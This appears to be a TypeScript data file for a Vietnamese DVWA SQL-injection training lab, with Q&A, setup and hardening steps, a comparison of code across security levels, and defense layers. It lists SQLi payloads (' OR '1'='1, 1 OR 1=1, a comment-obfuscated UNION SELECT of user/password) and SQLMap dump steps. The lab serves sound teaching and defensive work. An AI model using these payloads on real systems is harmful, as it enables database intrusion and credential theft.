      "Khi không có Salt, hàm băm MD5 luôn tạo ra một đầu ra cố định cho cùng một đầu vào (5f4dcc3b5aa765d61d8327deb882cf99 cho 'password'). Kẻ tấn công chỉ cần tra bảng cầu vồng (Rainbow Table) 1 lần là biết ngay cả admin lẫn smithy dùng chung mật khẩu, mở rộng chiếm quyền hàng loạt.",
    is_defense: true,
  },
  {
    id: "qa-3-2",
    member_number: 3,
    question: "Tạo user dvwa_svc với quyền SELECT, INSERT, UPDATE có giúp chống được lỗi SQL Injection không?",
    answer_summary:
      "Least Privilege không tự chặn lỗi nối chuỗi SQLi, nhưng nó giới hạn tối đa hậu quả (Blast Radius): kẻ tấn công không thể dùng quyền root để DROP TABLE, tạo user mới, hoặc đọc/ghi file hệ điều hành qua LOAD_FILE / INTO OUTFILE.",
    is_defense: true,
  },
  {
    id: "qa-4-1",
    member_number: 4,
    question: "Tại sao hàm mysqli_real_escape_string() trong medium.php vẫn bị SQL Injection vượt qua?",
    answer_summary:
      "Hàm mysqli_real_escape_string() chỉ thêm dấu gạch chéo ngược trước các ký tự nháy đơn ', nháy kép \"... Nhưng trong medium.php, biến $id đặt thẳng sau dấu bằng (WHERE user_id = $id) không có dấu nháy đơn bao quanh. Kẻ tấn công truyền payload kiểu số học như '1 OR 1=1' hoàn toàn không cần dùng dấu nháy đơn nên bộ lọc bị vô hiệu.",
    is_defense: true,
  },
  {
    id: "qa-4-2",
    member_number: 4,
    question: "Tại sao trong PoC 5 phải làm thêm bước tinh chỉnh trích xuất user_token thay vì chỉ chụp ảnh mã 302 Found?",
    answer_summary:
      "Mã 302 Found chỉ chứng minh lớp bảo vệ đầu tiên là Anti-CSRF checkToken() ở dòng 5 đã chạy, chưa chạm tới lớp kiểm tra $id và PDO Prepared Statements ở dòng 11–15. Phải gửi kèm user_token hợp lệ và payload id=1' để thấy hệ thống chặn ở is_numeric() và trả về 200 OK sạch lỗi mới chứng minh trọn vẹn bản vá SQLi.",
    is_defense: true,
  },
];

export const DEFAULT_WORKSPACE_STATES: Record<number, LabWorkspaceState> = {
  1: {
    member_number: 1,
    container_ref: "215d3a734374",
    phpsessid: "2d0vvd715drf3nv8mgq7vderg6",
    user_token: "d41d8cd98f00b204e9800998ecf8427e",
    completed_step_ids: [],
    notes: "Container ID thực tế 215d3a734374 (epic_dijkstra).",
  },
  2: {
    member_number: 2,
    container_ref: "dvwa",
    phpsessid: "7nst0hrqrfmv744a5ouj7663b0",
    user_token: "d41d8cd98f00b204e9800998ecf8427e",
    completed_step_ids: [],
    notes: "Burp Proxy 127.0.0.1:8081, truy cập localtest.me:8080.",
  },
  3: {
    member_number: 3,
    container_ref: "dvwa",
    phpsessid: "7nst0hrqrfmv744a5ouj7663b0",
    user_token: "d41d8cd98f00b204e9800998ecf8427e",
    completed_step_ids: [],
    notes: "SQLMap --batch & MariaDB CLI.",
  },
  4: {
    member_number: 4,
    container_ref: "dvwa",
    phpsessid: "7nst0hrqrfmv744a5ouj7663b0",
    user_token: "d41d8cd98f00b204e9800998ecf8427e",
    completed_step_ids: [],
    notes: "Kiểm toán 4 file PHP & PoC 5 tinh chỉnh.",
  },
};

export const UBUNTU_SETUP_COMMANDS = `# 1. Cập nhật hệ thống và cài đặt Docker cùng cURL, grep
sudo apt update && sudo apt install -y docker.io curl grep

# 2. Cấp quyền chạy Docker không cần gõ sudo
sudo usermod -aG docker $USER && newgrp docker

# 3. Kéo image DVWA và khởi chạy container đặt tên là "dvwa" ở cổng 8080
docker run --name dvwa -d -p 8080:80 vulnerables/web-dvwa`;

export const OWASP_BY_CWE: Record<string, string> = {
  "CWE-89": "A03:2021 - Injection",
  "CWE-250": "A04:2021 - Insecure Design",
  "CWE-200": "A05:2021 - Security Misconfiguration",
  "CWE-209": "A05:2021 - Security Misconfiguration",
  "CWE-759": "A02:2021 - Cryptographic Failures",
  "CWE-614": "A05:2021 - Security Misconfiguration",
};

const CVSS_METRIC_MAP: Record<
  string,
  { name: string; values: Record<string, { label: string; impact: "bad" | "warn" | "good" | "neutral" }> }
> = {
  AV: {
    name: "Vector tấn công",
    values: {
      N: { label: "Mạng (Network) — Khai thác từ xa qua HTTP", impact: "bad" },
      A: { label: "Mạng kề cận (Adjacent)", impact: "warn" },
      L: { label: "Cục bộ (Local)", impact: "good" },
      P: { label: "Vật lý (Physical)", impact: "good" },
    },
  },
  AC: {
    name: "Độ phức tạp tấn công",
    values: {
      L: { label: "Thấp (Low) — Không cần điều kiện đặc biệt", impact: "bad" },
      H: { label: "Cao (High) — Cần điều kiện phụ trợ", impact: "warn" },
    },
  },
  PR: {
    name: "Đặc quyền yêu cầu",
    values: {
      N: { label: "Không cần (None)", impact: "bad" },
      L: { label: "Thấp (Low) — Tài khoản user DVWA", impact: "warn" },
      H: { label: "Cao (High) — Quyền quản trị", impact: "good" },
    },
  },
  UI: {
    name: "Tương tác người dùng",
    values: {
      N: { label: "Không cần (None) — Tự động hóa được", impact: "bad" },
      R: { label: "Cần (Required) — Nạn nhân phải bấm/mở", impact: "warn" },
    },
  },
  S: {
    name: "Phạm vi ảnh hưởng",
    values: {
      U: { label: "Không đổi (Unchanged) — Trong phạm vi ứng dụng", impact: "neutral" },
      C: { label: "Thay đổi (Changed) — Lan sang thành phần khác", impact: "bad" },
    },
  },
  C: {
    name: "Ảnh hưởng Bảo mật (Confidentiality)",
    values: {
      H: { label: "Cao (High) — Đọc toàn bộ bảng users/DB", impact: "bad" },
      L: { label: "Thấp (Low) — Rò rỉ một phần thông tin", impact: "warn" },
      N: { label: "Không (None)", impact: "good" },
    },
  },
  I: {
    name: "Ảnh hưởng Toàn vẹn (Integrity)",
    values: {
      H: { label: "Cao (High) — Có thể sửa/xóa dữ liệu DB", impact: "bad" },
      L: { label: "Thấp (Low) — Sửa đổi hạn chế", impact: "warn" },
      N: { label: "Không (None)", impact: "good" },
    },
  },
  A: {
    name: "Ảnh hưởng Sẵn sàng (Availability)",
    values: {
      H: { label: "Cao (High) — Có thể làm sập/xóa bảng dịch vụ", impact: "bad" },
      L: { label: "Thấp (Low) — Giảm hiệu năng", impact: "warn" },
      N: { label: "Không (None)", impact: "good" },
    },
  },
};

export function parseCvssVector(vector: string): CvssMetricDetail[] {
  const parts = vector.replace(/^CVSS:[^/]+\//, "").split("/");
  const details: CvssMetricDetail[] = [];

  for (const part of parts) {
    const [code, valCode] = part.split(":");
    const meta = CVSS_METRIC_MAP[code];
    if (!meta || !valCode) continue;
    const valMeta = meta.values[valCode];
    details.push({
      code,
      name: meta.name,
      valueCode: valCode,
      valueLabel: valMeta ? valMeta.label : valCode,
      impactLevel: valMeta ? valMeta.impact : "neutral",
    });
  }

  return details;
}

export const CODE_COMPARISON_4_LEVELS: CodeComparison4Row[] = [
  {
    criterion: "Nguồn nhận tham số HTTP",
    low: "$_REQUEST['id'] (chấp nhận cả GET/POST/Cookie)",
    medium: "$_POST['id'] (đổi giao diện sang select dropdown)",
    high: "$_SESSION['id'] (tách nhập liệu sang trang popup riêng)",
    impossible: "$_GET['id'] kèm xác thực Anti-CSRF trước khi đọc",
  },
  {
    criterion: "Thư viện kết nối CSDL",
    low: "mysqli (thủ tục truyền thống)",
    medium: "mysqli (thủ tục truyền thống)",
    high: "mysqli (thủ tục truyền thống)",
    impossible: "PDO (PHP Data Objects hướng đối tượng)",
  },
  {
    criterion: "Cơ chế lọc dữ liệu $id",
    low: "Không kiểm tra bất kỳ ký tự nào",
    medium: "mysqli_real_escape_string($id) (chỉ thoát dấu nháy)",
    high: "Giới hạn độ dài giao diện + LIMIT 1 ở cuối SQL",
    impossible: "Kiểm tra kép is_numeric($id) (Dòng 11) + ép PDO::PARAM_INT",
  },
  {
    criterion: "Cấu trúc câu lệnh SQL",
    low: "Nối chuỗi: WHERE user_id = '$id'",
    medium: "Nối số: WHERE user_id = $id (không có nháy đơn)",
    high: "Nối chuỗi: WHERE user_id = '$id' LIMIT 1",
    impossible: "Tham số hóa: $db->prepare('...WHERE user_id = (:id) LIMIT 1')",
  },
  {
    criterion: "Bảo vệ Anti-CSRF",
    low: "Không có",
    medium: "Không có",
    high: "Không có",
    impossible: "checkToken() (Dòng 5) — trả 302 Found nếu thiếu token",
  },
  {
    criterion: "Xử lý lỗi hệ thống",
    low: "In thẳng mysqli_error() ra trình duyệt",
    medium: "In thẳng mysqli_error() ra trình duyệt",
    high: "In thẳng mysqli_error() ra trình duyệt",
    impossible: "Ẩn hoàn toàn lỗi hệ quản trị CSDL",
  },
  {
    criterion: "Khả năng chống SQLi / Bypass",
    low: "0% · Bị phá bởi ' hoặc ' OR '1'='1",
    medium: "Bị bypass bằng payload số học: 1 OR 1=1",
    high: "Bị bypass bằng chú thích # hoặc -- để cắt LIMIT 1",
    impossible: "100% An toàn · Tách biệt hoàn toàn Lệnh & Dữ liệu",
  },
];

export const DEFENSE_IN_DEPTH_LAYERS: DefenseLayerItem[] = [
  {
    layer_number: 1,
    layer_name: "Tầng 1 · Biên mạng & Reverse Proxy",
    target_component: "WAF ModSecurity CRS (SecRule 100001)",
    owner_member: 4,
    before_state: "Cho phép mọi chuỗi ký tự độc hại (', UNION, SELECT) đi thẳng tới PHP",
    after_state: "Ngắt kết nối ngay tại pha 2 với HTTP 403 Forbidden và ghi audit log CRITICAL",
    standard_ref: "OWASP A03:2021 · CRS 942100",
    verification_cmd: "Kiểm thử payload 1' OR 1=1 -> trả về HTTP/1.1 403 Forbidden",
  },
  {
    layer_number: 2,
    layer_name: "Tầng 2 · Máy chủ Web, Cookie & Giám sát Log",
    target_component: "Apache security.conf, Set-Cookie & access.log",
    owner_member: 1,
    before_state: "Lộ Server: Apache/2.4.25 (Debian), PHPSESSID thiếu HttpOnly/SameSite",
    after_state: "ServerTokens Prod chỉ trả 'Server: Apache'; truy vết IoC %27/UNION qua access.log",
    standard_ref: "CWE-200 · CWE-614 · Blue Team Forensics",
    verification_cmd: "curl -Is http://127.0.0.1:8080/login.php | grep -i Server:",
  },
  {
    layer_number: 3,
    layer_name: "Tầng 3 · Logic Ứng dụng PHP (impossible.php)",
    target_component: "checkToken() + is_numeric() + PDO Prepared Statements",
    owner_member: 4,
    before_state: "Ghép chuỗi trực tiếp vào mysqli_query() và in thẳng mysqli_error()",
    after_state: "Tách biệt pha biên dịch SQL và pha truyền tham số PDO::PARAM_INT",
    standard_ref: "CWE-89 · CWE-209 · OWASP A03:2021",
    verification_cmd: "Gửi PoC 5 tinh chỉnh (đủ user_token + id=1') -> 200 OK rỗng không lỗi SQL",
  },
  {
    layer_number: 4,
    layer_name: "Tầng 4 · Cơ sở dữ liệu & Mật mã học",
    target_component: "MariaDB (dvwa.users & tài khoản dịch vụ dvwa_svc)",
    owner_member: 3,
    before_state: "Lưu mật khẩu MD5 32-hex không Salt (admin & smithy trùng hash) + dùng root",
    after_state: "Băm thích ứng Bcrypt (cost=12) có Salt tự động + phân quyền tối thiểu dvwa_svc",
    standard_ref: "CWE-759 · CWE-250 · Least Privilege",
    verification_cmd: "SHOW GRANTS FOR 'dvwa_svc'@'localhost';",
  },
];

export const STEP_ENRICHMENTS: Record<string, StepEnrichment> = {
  "m1-s1": {
    verification_checks: [
      "Lệnh docker ps hiển thị trạng thái 'Up' và cột PORTS có ánh xạ 0.0.0.0:8080->80/tcp.",
      "Lệnh nmap -sV báo trạng thái '8080/tcp open http Apache httpd 2.4.25 ((Debian))'.",
    ],
    pitfalls: [
      {
        symptom: "docker ps báo lỗi 'Cannot connect to the Docker daemon'",
        cause: "Docker Desktop (trên macOS) chưa khởi động xong hoặc service docker trên Ubuntu đang tắt.",
        fix: "Mở Docker Desktop trên Mac hoặc chạy 'sudo systemctl start docker' trên Ubuntu.",
      },
      {
        symptom: "nmap báo '8080/tcp closed' dù container đã tạo",
        cause: "Container đang ở trạng thái Exited hoặc bị dừng sau khi khởi động lại máy.",
        fix: "Chạy 'docker start dvwa' (hoặc 'docker start 215d3a734374') rồi quét lại.",
      },
    ],
  },
  "m1-s2": {
    verification_checks: [
      "HTTP Header trả về mã 'HTTP/1.1 200 OK' cùng dòng 'Server: Apache/2.4.25 (Debian)'.",
      "Thấy đủ 2 dòng Set-Cookie cho PHPSESSID và security=low đều thiếu HttpOnly và SameSite=Strict.",
    ],
    pitfalls: [
      {
        symptom: "curl không in ra gì hoặc trả 302 chuyển sang setup.php",
        cause: "CSDL DVWA bên trong container vừa khởi tạo chưa bấm nút tạo bảng lần đầu.",
        fix: "Mở http://127.0.0.1:8080/setup.php trên trình duyệt và bấm Create / Reset Database.",
      },
    ],
  },
  "m1-s3": {
    verification_checks: [
      "Lệnh a2enconf security && service apache2 reload báo 'Reloading Apache httpd web server: apache2'.",
      "Lệnh curl -Is kiểm tra lại chỉ còn duy nhất 'Server: Apache', không còn '2.4.25 (Debian)'.",
    ],
    pitfalls: [
      {
        symptom: "Lệnh docker exec báo 'No such container'",
        cause: "Tên/ID container trên máy Ubuntu khác với máy Mac (215d3a734374 vs dvwa).",
        fix: "Cập nhật biến CONTAINER_REF phía trên thành 'dvwa' hoặc ID thật lấy từ lệnh docker ps.",
      },
    ],
  },
  "m1-s4": {
    verification_checks: [
      "Cả 2 dòng Set-Cookie (PHPSESSID và security=low) đều có hậu tố '; HttpOnly; SameSite=Strict'.",
      "Phản hồi HTTP có đủ 'X-Content-Type-Options: nosniff' và 'X-Frame-Options: SAMEORIGIN'.",
    ],
    pitfalls: [
      {
        symptom: "Apache báo lỗi syntax 'Invalid command Header, perhaps misspelled or defined by a module not included'",
        cause: "Chưa kích hoạt module mod_headers của Apache trước khi tải lại cấu hình.",
        fix: "Chạy lệnh 'a2enmod headers' bên trong container trước khi gọi 'service apache2 reload'.",
      },
      {
        symptom: "Chạy lặp lệnh nối >> nhiều lần khiến Set-Cookie bị gắn trùng lặp '; HttpOnly; SameSite=Strict'",
        cause: "Mỗi lần chạy '>>' sẽ nối thêm một dòng Header edit vào cuối tệp security.conf.",
        fix: "Kiểm tra cuối tệp bằng 'docker exec {{CONTAINER}} tail -n 10 /etc/apache2/conf-available/security.conf' hoặc xóa dòng thừa bằng nano/sed nếu chạy lại.",
      },
    ],
  },
  "m2-s1": {
    verification_checks: [
      "Tab Proxy Listeners của Burp Suite có dấu tick Running tại 127.0.0.1:8081 (không còn 8080).",
      "Mở http://localtest.me:8080 trong Burp Browser thấy gói tin xuất hiện ở Proxy -> HTTP history.",
    ],
    pitfalls: [
      {
        symptom: "Burp Proxy Listeners báo dấu chấm than đỏ ở cổng 8080",
        cause: "Xung đột cổng (Port Conflict) vì Docker DVWA đã lắng nghe cổng 8080.",
        fix: "Edit Proxy Listener trong Burp từ 8080 sang 8081 và mở lại Burp Chromium.",
      },
      {
        symptom: "Proxy Intercept không bắt được gói tin nào khi gửi form",
        cause: "Truy cập nhầm http://127.0.0.1:8080 hoặc localhost:8080 nên bị Chromium Loopback Bypass.",
        fix: "Đổi URL thanh địa chỉ trình duyệt sang http://localtest.me:8080/vulnerabilities/sqli/.",
      },
    ],
  },
  "m2-s2": {
    verification_checks: [
      "Gửi id=1' trên Repeater nhận lại đúng chuỗi '<pre>You have an error in your SQL syntax... near '''1''' at line 1</pre>'.",
      "Gửi id=' OR '1'='1 trả về đủ danh sách 5 người dùng (admin, Gordon, Hack, Pablo, Bob).",
    ],
    pitfalls: [
      {
        symptom: "Trình duyệt treo quay mãi khi dùng xong Intercept",
        cause: "Quên tắt 'Intercept is on' sau khi đã gửi gói tin sang Repeater bằng Ctrl+R.",
        fix: "Quay lại tab Proxy -> Intercept và bấm nút chuyển về 'Intercept is off'.",
      },
      {
        symptom: "Response trên Repeater trả về trang login.php (302 Found)",
        cause: "Giá trị Cookie security=low; PHPSESSID=... bị thiếu hoặc phiên cũ đã hết hạn.",
        fix: "Đăng nhập lại DVWA ở mức Low, copy PHPSESSID mới nhất dán vào khung Repeater và ô biến môi trường.",
      },
    ],
  },
  "m2-s3": {
    verification_checks: [
      "Lệnh cURL + grep trả về gọn 1 dòng 'First name: admin' mà không lẫn thẻ HTML.",
    ],
    pitfalls: [
      {
        symptom: "cURL chạy xong nhưng không in ra dòng nào (exit code 1)",
        cause: "PHPSESSID truyền vào -b chưa đăng nhập DVWA hoặc thiếu chuỗi 'security=low; ' đi kèm.",
        fix: "Đảm bảo tham số -b có đủ cả hai cặp: -b \"security=low; PHPSESSID=<mã_mới>\".",
      },
    ],
  },
  "m2-s4": {
    verification_checks: [
      "Lọc access.log thấy rõ 2 nhóm request: User-Agent 'Mozilla/5.0...' (Burp) và 'curl/...' (CLI).",
      "Quan sát được dấu hiệu IoC: ký tự %27, chuỗi OR+%271%27%3D%271 và chênh lệch kích thước bytes (1842 vs 2195).",
    ],
    pitfalls: [
      {
        symptom: "Lệnh grep trả về rỗng khi đọc /var/log/apache2/access.log",
        cause: "Chưa thực hiện truy vấn chứa ', %27, UNION, SELECT trước đó hoặc gõ sai tên container.",
        fix: "Chạy lại Bước 2 (gửi id=1' trên Repeater) rồi thực thi lại lệnh đọc access.log.",
      },
    ],
  },
  "m3-s1": {
    verification_checks: [
      "Lệnh 1 (--dbs) tìm ra đúng 2 database: dvwa và information_schema.",
      "Lệnh 2 (--tables) liệt kê được 2 bảng: guestbook và users.",
      "Lệnh 3 (--dump) xuất đủ 5 bản ghi users kèm mật khẩu rõ (admin -> password, gordonb -> abc123...).",
    ],
    pitfalls: [
      {
        symptom: "SQLMap báo không tìm thấy điểm tiêm ở tham số id và bỏ qua với --batch",
        cause: "Cookie PHPSESSID đã hết hạn hoặc đang để DVWA ở mức High/Impossible thay vì Low.",
        fix: "Kiểm tra lại mức DVWA Security đang là 'low' và lấy PHPSESSID mới nhất đưa vào --cookie.",
      },
      {
        symptom: "Lần chạy thứ 2 SQLMap không chạy lại dictionary crack",
        cause: "SQLMap lưu kết quả crack vào cache cục bộ (~/.local/share/sqlmap/output).",
        fix: "Thêm cờ --flush-session nếu muốn SQLMap thực hiện quét mới lại từ đầu.",
      },
    ],
  },
  "m3-s2": {
    verification_checks: [
      "Bảng users in ra 5 dòng; bản ghi 1 (admin) và bản ghi 5 (smithy) có cùng chuỗi 5f4dcc3b5aa765d61d8327deb882cf99.",
      "Độ dài mỗi chuỗi băm đúng 32 ký tự hex (128-bit MD5 không Salt).",
    ],
    pitfalls: [
      {
        symptom: "mysql -u root báo 'ERROR 1049 (42000): Unknown database dvwa'",
        cause: "Chưa chạy Create / Reset Database trên web /setup.php.",
        fix: "Truy cập http://127.0.0.1:8080/setup.php để khởi tạo CSDL DVWA.",
      },
    ],
  },
  "m3-s3": {
    verification_checks: [
      "PHP CLI sinh ra chuỗi 60 ký tự bắt đầu bằng '$2y$12$...'.",
      "Truy vấn SELECT sau khi UPDATE hiển thị mật khẩu mới của admin đã chuyển sang chuẩn Bcrypt.",
    ],
    pitfalls: [
      {
        symptom: "Giá trị cột password bị mất phần '$2y$12' chỉ còn dấu chấm sau khi UPDATE",
        cause: "Shell zsh/bash diễn giải chuỗi $2, $12 như biến môi trường bên trong dấu nháy kép.",
        fix: "Bắt buộc thêm dấu gạch chéo ngược \\ trước mọi dấu $ (viết \\$2y\\$12\\$...) khi chạy trong nháy kép bash.",
      },
    ],
  },
  "m3-s4": {
    verification_checks: [
      "Lệnh SHOW GRANTS xác nhận dvwa_svc@localhost CHỈ có quyền SELECT, INSERT, UPDATE trên dvwa.users.",
      "Không xuất hiện quyền ALL PRIVILEGES, DROP, ALTER hay FILE.",
    ],
    pitfalls: [
      {
        symptom: "Lệnh CREATE USER báo lỗi nếu chạy lặp lại lần thứ 2",
        cause: "Người dùng dvwa_svc đã được tạo ở lần chạy trước đó.",
        fix: "Dùng cú pháp an toàn CREATE USER IF NOT EXISTS như mẫu ở trên.",
      },
    ],
  },
  "m4-s1": {
    verification_checks: [
      "Đối chiếu đủ 4 file: low.php (dòng 5, 8, 9), medium.php (không có nháy quanh $id), high.php (session + LIMIT 1), impossible.php (dòng 5, 11, 13–15).",
    ],
    pitfalls: [
      {
        symptom: "Số dòng hiển thị lệch nếu mở nhầm file ngoài thư mục /vulnerabilities/sqli/source/",
        cause: "DVWA có nhiều module khác nhau (sqli_blind, xss_r...).",
        fix: "Kiểm tra đúng đường dẫn /var/www/html/vulnerabilities/sqli/source/{low,medium,high,impossible}.php.",
      },
    ],
  },
  "m4-s2": {
    verification_checks: [
      "Request gửi đi KHÔNG có user_token với Cookie security=impossible.",
      "Response trả về chính xác mã 'HTTP/1.1 302 Found', 'Location: index.php' và 'Content-Length: 0'.",
    ],
    pitfalls: [
      {
        symptom: "Response vẫn trả về 200 OK và dính lỗi SQL",
        cause: "Quên đổi dòng Cookie từ security=low thành security=impossible trong Burp Repeater.",
        fix: "Sửa header Cookie thành 'Cookie: security=impossible; PHPSESSID=...' rồi bấm Send lại.",
      },
    ],
  },
  "m4-s3": {
    verification_checks: [
      "Response trả về 'HTTP/1.1 200 OK' với trang HTML hợp lệ (không bị redirect 302 về index.php).",
      "Không xuất hiện bản ghi nào từ bảng users và TUYỆT ĐỐI không có thông báo lỗi MariaDB.",
    ],
    pitfalls: [
      {
        symptom: "Bấm Send lần đầu ra 200 OK, bấm Send lần hai lại bị 302 Found",
        cause: "DVWA ở mức impossible xoay vòng (rotate) user_token chỉ dùng một lần sau mỗi request.",
        fix: "Lấy chuỗi user_token mới nhất sinh ra trong body HTML của phản hồi trước để dán vào request tiếp theo.",
      },
    ],
  },
  "m4-s4": {
    verification_checks: [
      "Nắm rõ 5 thành phần của SecRule 100001: ARGS:id, @rx regex, phase:2, deny + status:403, log severity CRITICAL.",
      "Kiểm thử trên trình mô phỏng WAF với '1' OR 1=1' trả về 403 Forbidden và chuỗi '100' đi qua 200 OK.",
    ],
    pitfalls: [
      {
        symptom: "Biểu thức regex WAF chặn nhầm chuỗi hợp lệ",
        cause: "Viết luật quá rộng không giới hạn đúng biến ARGS:id.",
        fix: "Giữ chặt danh sách ký tự/từ khóa SQLi trong @rx và kiểm chứng bằng cả input hợp lệ lẫn input tấn công.",
      },
    ],
  },
  "m1-s5": {
    verification_checks: [
      "docker inspect xác nhận HostConfig.ReadonlyRootfs == true và CapDrop == ['ALL'].",
      "Thử ghi /var/www/html/shell.php trả về lỗi 'Read-only file system'.",
    ],
    pitfalls: [
      {
        symptom: "Apache không khởi động được khi bật --read-only",
        cause: "Tiến trình Apache cần ghi PID file vào /var/run/apache2 và session vào /tmp.",
        fix: "Mount thêm --tmpfs /var/run/apache2:rw,noexec,nosuid và --tmpfs /tmp:rw,noexec,nosuid để cho phép runtime hoạt động trong RAM mà không thực thi mã nhị phân.",
      },
    ],
  },
  "m1-s6": {
    verification_checks: [
      "Chạy python3 public/engineering/son_sec_gate.py --demo default trả về FAIL (0/100, exit 1).",
      "Chạy python3 public/engineering/son_sec_gate.py --demo hardened trả về PASS (100/100, exit 0).",
    ],
    pitfalls: [
      {
        symptom: "Script báo Docker CLI not available khi kiểm thử trên máy không cài Docker",
        cause: "Môi trường chỉ chạy thử web hoặc CI runner tách biệt Docker daemon.",
        fix: "Sử dụng cờ --demo default / --demo hardened để kiểm chứng logic chấm điểm, hoặc chạy trên host có Docker daemon.",
      },
    ],
  },
  "m2-s5": {
    verification_checks: [
      "Chạy hung_blind_bisect.py --demo thấy rõ từng bước thu hẹp khoảng [low..high] -> mid.",
      "Giá trị trích xuất cuối cùng khớp chính xác 'dvwa' với tỷ lệ tiết kiệm ~85% request.",
    ],
    pitfalls: [
      {
        symptom: "Vòng lặp không dừng khi ký tự vượt ngoài bảng ASCII chuẩn",
        cause: "Dữ liệu Unicode hoặc chuỗi rỗng không có kiểm tra EOF trước khi chia đôi.",
        fix: "Luôn gửi truy vấn kiểm tra ASCII(...) > 0 làm điều kiện dừng EOF trước mỗi vị trí pos.",
      },
    ],
  },
  "m2-s6": {
    verification_checks: [
      "Chạy hung_blind_bisect.py --demo-entropy phân loại đúng request thường (NORMAL) và các probe Blind/UNION SQLi (ALERT).",
    ],
    pitfalls: [
      {
        symptom: "Báo động giả trên URL tìm kiếm dài có tiếng Việt",
        cause: "Không chuẩn hóa ngưỡng theo đường cơ sở lưu lượng thực tế.",
        fix: "Kết hợp đồng thời hai tín hiệu: Shannon Entropy (H >= 4.2) và Response-Bytes Z-score (|Z| >= 1.8) để loại bỏ nhiễu.",
      },
    ],
  },
  "m3-s5": {
    verification_checks: [
      "Chạy quyet_zero_downtime_migration.sql thành công trên database dvwa.",
      "Gọi CALL sp_authenticate_and_upgrade(...) trả về trạng thái UPGRADED_ON_LOGIN và hash_algo = bcrypt_2y.",
    ],
    pitfalls: [
      {
        symptom: "Vẫn còn bản ghi giữ mật khẩu MD5 sau ngày đầu chuyển đổi",
        cause: "Các tài khoản ít hoạt động chưa đăng nhập lại sau thời điểm di trú.",
        fix: "Kết hợp cơ chế hết hạn mật khẩu theo chu kỳ (90 ngày) hoặc đặt cờ bắt buộc đổi mật khẩu cho tài khoản vẫn mang hash_algo='md5_legacy'.",
      },
    ],
  },
  "m3-s6": {
    verification_checks: [
      "SHOW COLUMNS FROM v_user_public_profile không còn chứa bất kỳ cột password nào.",
      "Truy vấn chạm tới user_id = 0 sinh bản ghi severity CRITICAL trong security_canary_alerts.",
    ],
    pitfalls: [
      {
        symptom: "Ứng dụng đăng nhập báo lỗi không tìm thấy cột password trên View",
        cause: "Quên tách riêng tài khoản đọc hồ sơ (dvwa_app chỉ đọc View) với luồng xác thực (gọi Stored Procedure DEFINER).",
        fix: "Cấp SELECT trên v_user_public_profile cho chức năng tra cứu và chỉ cấp EXECUTE trên sp_authenticate_and_upgrade cho luồng Login.",
      },
    ],
  },
  "m4-s5": {
    verification_checks: [
      "Chạy khanh_sql_lexer_waf.py --benchmark xác nhận Naive Regex chặn nhầm O'Connor và để lọt /*!50000UNION*/ + %2527.",
    ],
    pitfalls: [
      {
        symptom: "Cố vá Regex bằng cách thêm ngoại lệ lẻ tẻ",
        cause: "Ngôn ngữ SQL là ngữ cảnh tự do (Context-Free) còn Regex chỉ xử lý ngữ pháp chính quy (Regular Grammar).",
        fix: "Chuyển kiến trúc lọc sang trình phân tích từ vựng SQL Lexical Tokenizer.",
      },
    ],
  },
  "m4-s6": {
    verification_checks: [
      "O'Connor được SQL Lexer chấm ALLOW (0% False Positive).",
      "1' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users# bị chuẩn hóa và chặn với Fingerprint n'kkkkw.",
    ],
    pitfalls: [
      {
        symptom: "Dùng PDO nhưng vẫn để mặc định PDO::ATTR_EMULATE_PREPARES = true",
        cause: "PHP tự nội suy chuỗi phía client thay vì gửi gói tin Prepare + Execute tách biệt xuống MySQL Server.",
        fix: "Luôn khai báo rõ PDO::ATTR_EMULATE_PREPARES => false khi khởi tạo kết nối PDO.",
      },
    ],
  },
};

export const LAB_MAINTENANCE_COMMANDS: LabMaintenanceCmd[] = [
  {
    id: "check-ports",
    title: "Kiểm tra tiến trình đang chiếm cổng 8080 / 8081",
    command: `lsof -i :8080 -i :8081 || ss -tulpn | grep -E "8080|8081"`,
    explanation: "Giúp chẩn đoán nhanh khi Docker hoặc Burp Suite báo lỗi cổng đã được sử dụng.",
  },
  {
    id: "tail-logs",
    title: "Theo dõi Apache access.log theo thời gian thực (Blue Team Live Monitor)",
    command: `docker exec -it dvwa tail -f /var/log/apache2/access.log`,
    explanation: "Quan sát ngay lập tức từng gói tin từ Burp Suite, cURL và SQLMap đổ vào máy chủ web.",
  },
  {
    id: "reset-dvwa",
    title: "Khôi phục sạch container DVWA về trạng thái ban đầu trước buổi demo",
    command: `docker rm -f dvwa && docker run --name dvwa -d -p 8080:80 vulnerables/web-dvwa`,
    explanation: "Xóa sạch các bản vá Apache/Bcrypt cũ nếu cần chạy demo lại từ bước 1 trên container mới tinh.",
  },
];
